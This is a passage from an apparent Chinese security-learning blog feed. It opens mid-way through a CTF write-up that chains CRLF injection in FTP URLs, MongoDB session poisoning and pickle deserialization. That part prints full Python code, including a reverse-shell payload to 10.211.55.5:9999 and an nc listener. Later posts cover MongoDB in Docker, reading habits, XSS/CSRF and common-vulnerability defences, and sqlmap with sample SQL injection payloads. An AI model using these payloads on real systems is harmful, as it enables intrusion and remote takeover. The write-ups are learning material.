服务器中）</p><p>生成数据包之前需要先修改 pymongo 中的 <code>network.py</code> 文件，用来捕获数据包。使用下面的命令找到 pymongo 的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pymongo;print(pymongo.__file__)&quot; </span><br></pre></td></tr></table></figure><p>运行即可找到 pymongo 的路径<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E1BB5D5D-EEDA-47EF-8DA7-1B1B00C9A922.png"></p><p>使用 sendall 关键字寻找<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210207201744.png"><br>在 try 前，添加如图所示的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;session:&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">    e = Exception()</span><br><span class="line">    e.message = msg</span><br><span class="line">    <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>最后在 ftp 服务器的目录下生成 mongo 数据包（二进制文件）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建反序列化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pickle</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pickle.dumps(exp())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取mongo的请求包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mongo</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    client = MongoClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">27018</span>)</span><br><span class="line">    coll = client.admin.sessions</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        coll.update_one(</span><br><span class="line">            &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;session:922b2d8f-26c8-4146-8742-9d62b3988a17&#x27;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;$set&quot;</span>: &#123;<span class="string">&quot;val&quot;</span>: get_pickle(cmd)&#125;&#125;,</span><br><span class="line">            upsert=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> e.message</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    packet = get_mongo(</span><br><span class="line">        cmd=<span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.5&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(packet)</span><br><span class="line"></span><br><span class="line">    file = open(<span class="string">&#x27;slug01sh&#x27;</span>, <span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">    file.write(packet)</span><br></pre></td></tr></table></figure><p>记得修改上面的session（mongo通过session来找到用户）和 cmd（反序列化时会被运行的指令）。</p><p>运行脚本生成 mongo 数据包<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1EF3510F-4CA4-4C49-AF4B-8C749E24C4CB.png"></p><h2 id="2-4-FTP服务器（虚拟机）"><a href="#2-4-FTP服务器（虚拟机）" class="headerlink" title="2.4 FTP服务器（虚拟机）"></a>2.4 FTP服务器（虚拟机）</h2><p>FTP 服务器源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyftpdlib.authorizers <span class="keyword">import</span> DummyAuthorizer</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.handlers <span class="keyword">import</span> FTPHandler</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.servers <span class="keyword">import</span> FTPServer</span><br><span class="line"></span><br><span class="line">authorizer = DummyAuthorizer()</span><br><span class="line"></span><br><span class="line">authorizer.add_user(<span class="string">&quot;fan&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;.&quot;</span>,perm=<span class="string">&quot;elrafmwMT&quot;</span>)</span><br><span class="line">authorizer.add_anonymous(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">handler = FTPHandler</span><br><span class="line">handler.permit_foreign_addresses = <span class="literal">True</span></span><br><span class="line">handler.passive_ports = range(<span class="number">2000</span>, <span class="number">2030</span>)</span><br><span class="line">handler.authorizer = authorizer</span><br><span class="line"></span><br><span class="line">server = FTPServer((<span class="string">&quot;10.211.55.5&quot;</span>, <span class="number">8877</span>), handler)</span><br><span class="line">server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行状态：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/CB0AFCCA-C6F0-46F8-9E91-85E928A893BA.png"></p><h1 id="3-攻击"><a href="#3-攻击" class="headerlink" title="3 攻击"></a>3 攻击</h1><p>准备 CRLF 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_port_cmd</span>(<span class="params">host</span>):</span></span><br><span class="line">    ip, port = host.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    ip = <span class="string">&#x27;,&#x27;</span>.join(ip.split(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">    port = int(port)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;port <span class="subst">&#123;ip&#125;</span>,<span class="subst">&#123;port // <span class="number">256</span>&#125;</span>,<span class="subst">&#123;port - port // <span class="number">256</span> * <span class="number">256</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 向本地的FTP发送消息</span></span><br><span class="line">    target = <span class="string">&#x27;10.211.55.5:8877&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># FTP的消息</span></span><br><span class="line">    commands = [<span class="string">&#x27;type i&#x27;</span>, get_port_cmd(host=<span class="string">&#x27;10.211.55.2:27018&#x27;</span>), <span class="string">&#x27;retr slug01sh&#x27;</span>]</span><br><span class="line">    commands_str = <span class="string">&#x27;\r\n&#x27;</span>.join(commands)</span><br><span class="line">    commands_str = urllib.parse.quote(commands_str)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;ftp://fan:root@&#x27;</span>+target+<span class="string">&#x27;/\r\n&#x27;</span>+commands_str</span><br><span class="line">    urllib.request.urlopen(url)</span><br></pre></td></tr></table></figure><p>可以运行脚本的 Python 版本：</p><ul><li>Python 3.x版本至3.7.2版本中的urllib</li></ul><p>运行CRLF代码，可以看到虚拟机中的 FTP 服务器显示发送成功<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/13FE4614-653F-4526-A188-E2722648A872.png"></p><p>使用 navicat 连接 mongo，观察集合可以发现，通过 val 的长度来判断是否被更新成功。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/5BB58490-6651-4221-B461-9FB6892B3A08.png"><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/645A6587-FE02-40FF-8FE7-337BB8287E7B.png"></p><p>在虚拟机中使用 nc -lvp 9999 等待反弹 shell，使用浏览器访问  <a href="http://127.0.0.1:5000/get">http://127.0.0.1:5000/get</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> ssrf </tag>
            
            <tag> crlf </tag>
            
            <tag> ftp </tag>
            
            <tag> mongodb </tag>
            
            <tag> session </tag>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何查看Docker中mongodb的内容？</title>
      <link href="0dc114d8c403/"/>
      <url>0dc114d8c403/</url>
      
        <content type="html"><![CDATA[<!-- 1. 修改标题、分类、标签2. 拟写正文3. 第二天并尝试修改4. 自己阅读一遍5. 发布6. 删除注释、删除密码 --><h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>最近在尝试做 starCTF 中的 oh-my-bet，需要使用 CRLF 来控制 FTP 向 mongodb 中发送数据包来修改 mongodb 中的内容。需要通过查看 mongodb 中的内容来确定是否修改成功。</p><p>Docker-compose 文件中的配置如下：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210207154658.png"></p><p>使用命令 <code>docker-compose up -d</code> 启动 Web 服务之后<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210207154911.png"><br>我们可以看见 docker 中的 mongo 并没有和本地的端口进行绑定，所以不能直接使用 localhost 进行连接。</p><p>使用 <code>ifconfig</code> 命令可以看到 mongo 启动的主机和宿主机位于同一个局域网。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210207155106.png"><br>我猜测可以直接使用局域网的 IP 和端口进行连接</p><h1 id="2-kali-安装-mongodb"><a href="#2-kali-安装-mongodb" class="headerlink" title="2 kali 安装 mongodb"></a>2 kali 安装 mongodb</h1><p>添加公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - https://www.mongodb.org/static/pgp/server-4.2.asc | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>创建列表文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;deb http://repo.mongodb.org/apt/debian buster/mongodb-org/4.2 main&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-4.2.list</span><br></pre></td></tr></table></figure><p>重新加载包数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>安装 mongodb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y mongodb-org</span><br></pre></td></tr></table></figure><p>安装 mongodb。自定义版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y mongodb-org=4.2.3 mongodb-org-server=4.2.3 mongodb-org-shell=4.2.3 mongodb-org-mongos=4.2.3 mongodb-org-tools=4.2.3</span><br></pre></td></tr></table></figure><h1 id="3-连接mongo并查看数据"><a href="#3-连接mongo并查看数据" class="headerlink" title="3 连接mongo并查看数据"></a>3 连接mongo并查看数据</h1><p>连接 mongodb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --host 172.20.0.5 --port 27017</span><br></pre></td></tr></table></figure><p>查看数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 列出数据库</span></span><br><span class="line"><span class="keyword">show</span> dbs;</span><br><span class="line"><span class="comment">-- 使用 admin </span></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">admin</span>;</span><br><span class="line"><span class="comment">-- 列出集合（表）</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"><span class="comment">-- 查询集合 sessions 的所有内容</span></span><br><span class="line">dbs.sessions.find().pretty()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> kali </tag>
            
            <tag> mongo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>技术类书籍和思维类书籍怎么阅读？</title>
      <link href="32185d2476d4/"/>
      <url>32185d2476d4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-技术书籍阅读法：明确目的"><a href="#1-技术书籍阅读法：明确目的" class="headerlink" title="1 技术书籍阅读法：明确目的"></a>1 技术书籍阅读法：明确目的</h1><p>大致步骤：</p><ul><li>根据你的目的和问题，摘录关键词和行动，形成简单的笔记</li><li>利用新学的知识在工作中展开实践，或者独立做一个小的项目</li><li>过程中记录下自己实践的感受和踩坑的关键点</li><li>回过头来完善自己的笔记，并最终整理输出</li></ul><p>关键点：</p><ol><li>设定读书目标，带着问题选择和阅读。<br>技术类的书籍，就是要带着问题找答案。首先，要围绕你的目标，寻找适合的书单。其次，带着你的关键疑惑，用倍数阅读法找你要解决的问题，可以跳读和略读。在快速阅读中记录核心关键词，每10个关键词可以归纳成3-5个重点或一系列动作。<blockquote><p>如何围绕目标选书单？假设，你遇到的问题是——【如何设计一个秒杀系统？】，书单的列表可能要包括：<br>原理侧：CAP原理<br>架构侧：静态文件分离、CDN设计、Redis缓存原理、数据库乐观锁设计、限流方案设计、负载均衡策略<br>代码侧：库存拍减、扣减、和预扣，关单回补设计，库存预热<br>安全侧：如何防黄牛，防恶拍，防DDOS攻击<br>——淘系技术部技术专家 殷浩</p></blockquote></li></ol><ol start="2"><li><p>设定行动目标，学以致用良好循环<br>知识付诸行动才有转化为能力的效果。有些同学疑问为什么自己边看边敲，做笔记，实现阶段性的小效果，最后还是如同水流过的石头一样，风一吹，太阳一晒，什么都没有留下。（我目前的状态）</p></li><li><p>对于特别艰森的技术论文或内容的阅读方法<br>面对一个晦涩难懂的主体，脚注、尾注、参考文献等，不放过任何一个细小的东西。你应该分而化之，切成小知识块，再逐个对付，你最终能填补所有的知识缺口，否则，这些缺口将阻挠你理解整个想法。找一篇该领域的核心文章，顺蔓摸瓜研究完所有的辅助材料，你也会对这个领域留下整体的理解和印象。<br>（费曼学习法）</p></li><li><p>一本万利的神仙级读书方法——量子速读法（手动狗头）<br>“遇事不决，量子力学。”<br>闭上眼睛，打开感知，2分钟内看完一本10万字书籍，还能妥妥复述出来。<br>没有什么书，是量子速读法不能解决的。<br>只要你真敢信。</p></li></ol><h1 id="2-泛思维类书籍阅读法：抓住主题"><a href="#2-泛思维类书籍阅读法：抓住主题" class="headerlink" title="2 泛思维类书籍阅读法：抓住主题"></a>2 泛思维类书籍阅读法：抓住主题</h1><p>科学、历史、哲学、物理这类书籍，能够帮助人提升思想的层次和认知的境界。</p><p>主要方法：提问+回答，尽力回答下面问题，或者提出更多的问题。</p><ol><li>整本来说，这本书在讲什么？（检视阅读）</li><li>这本书的细节部分说了哪些？是如何展开的？（分析阅读）</li><li>这本书的观点有道理吗？是整体有道理，还是部分有道理？（分析阅读）</li><li>这本书与你的关系是什么？（主题阅读）</li></ol><p>每一本读完后，强制自己输出对这些问题的答案。想要从书中获取思想的进步，你就要和这本书“产生交互”。它必然不是一个消遣的过程。</p><p>读书首在选书。然后读书先看脉路，最后顺序看细节，看完后核心是结合自身经历的链接和思考，然后回去再去读温故而知新。好的书需要读很多遍其义自现。核心还是读书同时的思考和融会贯通。每本书里「能有几点和自身经历相结合有所感悟就是值得」的。</p><p>参考：</p><ol><li>技术类的书籍怎么阅读才能达到最好的效果呢？：<a href="https://www.zhihu.com/question/20230133">https://www.zhihu.com/question/20230133</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次尝试挖洞信息搜集</title>
      <link href="791fa9828347/"/>
      <url>791fa9828347/</url>
      
        <content type="html"><![CDATA[<p>在看书的时候觉得信息收集的手法都应该差不多了吧，但是到真正上手的时候，才发现难点重重。</p><p>今天尝试挖教育SRC来进行测试自己的能力，发现并没有想象中的那么好挖。一个学校的子域名非常的多，有些网站虽然能看到报错点，但是无从下手。</p><p>感觉只收集了一堆隐私信息，还得学习学习人家大佬的挖洞经验</p><p>待续……</p>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防之XSS基础基本概念和基本思想</title>
      <link href="eee80eb68cdd/"/>
      <url>eee80eb68cdd/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介与对比"><a href="#1-简介与对比" class="headerlink" title="1 简介与对比"></a>1 简介与对比</h1><p>XSS攻击可以分为三种</p><ol><li>反射型：一次性、通过邮件传播、需要经过服务器</li><li>Dom 型（文档对象模型，Document Object Model）：一次性、不需经过服务器（不发送消息）</li><li>存储型：持久性、通常出现在留言板中、通常是处于信任的链接中（熟悉的论坛网站）</li></ol><p>反射型和存储型都需要向外部发送信息，经过服务器后传回，而 DOM 型由本地的浏览器进行解析执行。</p><p>区别反射型和 DOM 型最简单的检验方法就是「Burp 抓包」，如果 Burp 抓到数据就是反射型，抓不到数据就是DOM型。（面试时童童师傅教的</p><p>DOM 型和反射型通常都是攻击者构造 URL，存储型则是构造 Payload 测试网站的输入点。</p><ul><li>DOM型：数据=&gt;客户端</li><li>反射型：数据=&gt;服务器=&gt;客户端</li><li>存储型：数据=&gt;服务器=&gt;数据库=&gt;客户端</li></ul><h1 id="2-防御XSS"><a href="#2-防御XSS" class="headerlink" title="2 防御XSS"></a>2 防御XSS</h1><p>XSS 的修复分为输入和输出两部分。通过过滤将输入的恶意代码拦截到外面（类似乘飞机的安检）。在输出时也必须要留意，否则过去输入的恶意代码可能也会造成 XSS。</p><ol><li>过滤’、“、&lt;、&gt;、on*等非法字符。</li><li>输出的到页面的数据，需要进行HTML实体编码、Javascript编码。</li></ol><h1 id="3-基本思想"><a href="#3-基本思想" class="headerlink" title="3 基本思想"></a>3 基本思想</h1><ul><li>XSS的存在，一定伴随着输入与输出这两个概念（所以在防御时需要输入过滤、输出编码来进行防御）。在输出时不太方便过滤，如果是文章中写了3&lt;5，被过滤后就只有3 5，故在输出时常用编码防御，而不是过滤。</li><li>XSS和SQL注入类似，都是文本被当作代码执行，不同点在于XSS的代码执行在客户端，SQL注入的代码执行在服务器端。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防之常见漏洞及防御方式</title>
      <link href="3e1f53561977/"/>
      <url>3e1f53561977/</url>
      
        <content type="html"><![CDATA[<h1 id="1-SSRF"><a href="#1-SSRF" class="headerlink" title="1 SSRF"></a>1 SSRF</h1><p>SSRF漏洞的产生原因：服务器提供了从其他服务器获取数据的功能，并且没有对地址和协议进行过滤和限制。比如：2020年10月ByteCTF的easy_scrapy。</p><p>这种漏洞在CTF中也很常见，可以用来攻击内网中的应用，如：Redis、discuz7、fastcgi、memcache、webdav、struts、jboss、axis2等应用。</p><p>防御方式：</p><ul><li>限制请求的端口只能是Web端口</li><li>限制不能访问内网的IP（IPTable）</li><li>屏蔽返回的内容</li></ul><p>参考文章：</p><ol><li>浅析SSRF原理及利用方式：<a href="https://www.anquanke.com/post/id/145519">https://www.anquanke.com/post/id/145519</a></li></ol><h1 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2 文件上传"></a>2 文件上传</h1><p>文件上传漏洞产生原因：文件上传的路径和文件类型没有进行限制，导致上传后的文件可以被当作代码执行。</p><p>文件上传的绕过方式：</p><ol><li>JS检测绕过</li><li>文件后缀绕过</li><li>文件类型绕过（HTTP包的Conten-Type）</li><li>竞争条件（在删除文件前另外创建一个文件）</li></ol><p>防御方式</p><ul><li>白名单判断文件后缀是否合法（黑名单容易过滤不全）</li><li>对上传后的文件进行重命名。</li></ul><h1 id="3-暴力破解"><a href="#3-暴力破解" class="headerlink" title="3 暴力破解"></a>3 暴力破解</h1><p>暴力破解产生的原因：服务器没有做访问限制，攻击者可以进行逐个测试（弱密码）。</p><p>常见的暴力破解方式：</p><ul><li>用户名和密码错误次数都无限制（可以随便暴力破解）</li><li>单时间段内用户的密码错误次数限制（例如：锁QQ。只限制了单个用户的密码次数，可以考虑更换用户名再进行暴力破解，只需要用一个用户列表即可）</li><li>单时间段内IP登陆错误次数限制（IP池绕过）</li></ul><p>暴力破解的关键在于字典，如果想要提升暴力破解的成功率，就需要缩小破解范围（例如：获取学号的列表范围，然后使用默认密码爆破，如果密码是生日，那字典的生成最好符合日期的范围）。</p><p>防御方法：</p><ul><li>使用较高级别的验证码</li><li>使用多因素验证</li><li>用户登陆次数超过设置的阀值，则锁定账号。</li><li>单个IP登陆次数超过设置的阀值，则锁定IP。</li></ul><h1 id="4-命令执行"><a href="#4-命令执行" class="headerlink" title="4 命令执行"></a>4 命令执行</h1><p>命令执行的原因：类似SQL注入、XSS漏洞，都是将文本当作代码进行执行。</p><p>防御方法：</p><ul><li>尽量不要使用直接命令执行的函数，可以考虑找封装后的包来用。</li><li>执行函数前进行过滤。</li></ul><h1 id="5-XXE漏洞"><a href="#5-XXE漏洞" class="headerlink" title="5 XXE漏洞"></a>5 XXE漏洞</h1><p>XXE漏洞的原因：类似SQL注入、XSS漏洞、命令执行，都是将文本当作代码进行执行（为什么能代码执行呢？XML文件被导入时能引入外部实体）。</p><p>XXE漏洞的危害有很多，比如可以文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等。</p><p>防御方法</p><ul><li>禁止引用外部实体</li><li>过滤XML中的数据</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 《Web安全攻防》 </tag>
            
            <tag> SSRF </tag>
            
            <tag> 暴力破解 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防之CSRF攻击与XSS攻击区别</title>
      <link href="45766d76d1c8/"/>
      <url>45766d76d1c8/</url>
      
        <content type="html"><![CDATA[<p>反射型XSS和CSRF的相同点：</p><ul><li>都需要用户点击链接，访问恶意构造的链接。</li></ul><p>反射型XSS和CSRF的不同点：</p><ul><li>XSS偏向于代码执行。代码可以被黑客构造，能够实现复杂的功能，更加的危险。</li><li>CSRF则偏向于结果。通常情况是利用系统自带的功能来实现黑客想要达到的结果，比如刷访问量、发布文章。</li></ul><p>XSS也能实现CSRF的功能，不过能GetShell，你会只用来刷访问量？（逃🤡</p><p>防御方式：</p><ul><li>验证Refer</li><li>验证token<ul><li>CSRF tokens是防护CSRF的关键</li><li>CSRF tokens现在通常是一个秘钥或者salt的hash</li></ul></li></ul><p>参考教程：</p><ol><li>用大白话谈谈XSS与CSRF：<a href="https://segmentfault.com/a/1190000007059639">https://segmentfault.com/a/1190000007059639</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《Web安全攻防》 </tag>
            
            <tag> xss </tag>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防之SQLmap使用</title>
      <link href="c58286e959c7/"/>
      <url>c58286e959c7/</url>
      
        <content type="html"><![CDATA[<p>《Web安全攻防》使用sqli-labs来熟悉一下SQLmap这个神器，我也大致的熟悉一下这个工具的使用吧。</p><p>SQL注入的基本步骤：</p><ul><li>判断注入类型</li><li>获取数据库名</li><li>获取数据表名</li><li>获取字段名</li><li>获取数据</li></ul><h1 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1 判断注入类型"></a>1 判断注入类型</h1><h2 id="1-1-Get类型"><a href="#1-1-Get类型" class="headerlink" title="1.1 Get类型"></a>1.1 Get类型</h2><p>使用 -u 参数指定url（sqlmap关卡1）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;localhost:4000&#x2F;Less-1?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure><p>需要注意的是：URL最好附带请求的参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind（布尔盲注）</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 9623&#x3D;9623 AND &#39;JjhO&#39;&#x3D;&#39;JjhO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Type: error-based（报错注入）</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND GTID_SUBSET(CONCAT(0x71767a7871,(SELECT (ELT(3702&#x3D;3702,1))),0x716a6b6271),3702) AND &#39;oyIr&#39;&#x3D;&#39;oyIr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Type: time-based blind（延时注入）</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 8003 FROM (SELECT(SLEEP(5)))etaK) AND &#39;ACHt&#39;&#x3D;&#39;ACHt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Type: UNION query（联合注入）</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;-9510&#39; UNION ALL SELECT NULL,CONCAT(0x71767a7871,0x65497456414974586b4c4a676479645971685666684c6163637353757955774841706b47726a6755,0x716a6b6271),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>上面提到了参数id可以使用4种注入技术（布尔、报错、延时、联合），还给出了所使用的Payload（有效载荷）。SQLmap采用5种SQL注入技术：</p><ul><li>联合注入</li><li>报错注入</li><li>布尔盲注</li><li>延时注入</li><li>堆叠注入</li></ul><p>如果不太熟悉这些注入类型，可以去sqli-labs做一下，可以参考我前面的这篇文章：<a href="https://blog.csdn.net/qq_43085611/article/details/112661431%E3%80%82">https://blog.csdn.net/qq_43085611/article/details/112661431。</a></p><h2 id="1-2-POST或GET类型"><a href="#1-2-POST或GET类型" class="headerlink" title="1.2 POST或GET类型"></a>1.2 POST或GET类型</h2><p>使用 Burp Suite 抓包（需要抓包的网页是个本地搭建的网址, 一般会通过localhost 或者 127.0.0.1 访问，但是如果通过这俩个地址的话 Burp Suite 是抓不到包的，可以考虑修改 host 的方法来使用其他域名访问），最后将抓到的包保存到本地为 1.txt 文件。<br><img 